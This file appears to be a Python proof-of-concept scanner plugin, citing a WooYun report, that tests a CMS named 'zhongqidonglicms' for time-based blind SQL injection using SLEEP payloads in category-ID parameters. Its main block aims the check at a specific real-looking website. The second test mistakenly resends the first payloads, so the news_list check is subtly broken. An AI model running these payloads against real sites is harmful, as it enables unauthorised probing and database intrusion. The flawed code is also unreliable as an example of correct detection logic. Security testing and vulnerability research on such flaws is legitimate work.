#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__author__ = 'range'
#refer: http://www.wooyun.org/bugs/wooyun-2015-0145311
import re
import time

def assign(service, arg):
    if service == "zhongqidonglicms":
        return True, arg

def audit(arg):
    payload1_0="membersarticle_list/&membersarticleCategoryId=1' AND (SELECT * FROM (SELECT(SLEEP(0)))qoxp) AND 'KGia'='KGia.html"
    payload1_5="membersarticle_list/&membersarticleCategoryId=1' AND (SELECT * FROM (SELECT(SLEEP(5)))qoxp) AND 'KGia'='KGia.html"
    time1_0 = time.time()
    code0, head, res, errcode, _ = curl.curl2(arg+payload1_0)
    time1_end_0 = time.time()-time1_0
    time1_5 = time.time()
    code5, head, res, errcode, _ = curl.curl2(arg+payload1_5)
    time1_end_5= time.time()-time1_5
    if code0==200 and code5==200 and time1_end_5-time1_end_0>4.5:
        security_hole(arg+payload1_5+ ' sql injection!')



    payload2_0="news_list/&newsCategoryId=6' AND (SELECT * FROM (SELECT(SLEEP(0)))qoxp) AND 'KGia'='KGia.html"
    payload2_5="news_list/&newsCategoryId=6' AND (SELECT * FROM (SELECT(SLEEP(5)))qoxp) AND 'KGia'='KGia.html"

    time2_0 = time.time()
    code0, head, res, errcode, _ = curl.curl2(arg+payload1_0)
    time2_end_0 = time.time()-time2_0
    time2_5 = time.time()
    code5, head, res, errcode, _ = curl.curl2(arg+payload1_5)
    time2_end_5= time.time()-time2_5
    if code0==200 and code5==200 and time2_end_5-time2_end_0>4.5:
        security_hole(arg+payload2_5+ ' sql injection!')

if __name__ == '__main__':
    from dummy import *
    audit(assign('zhongqidonglicms', 'http://www.cnjhhg.com/')[1])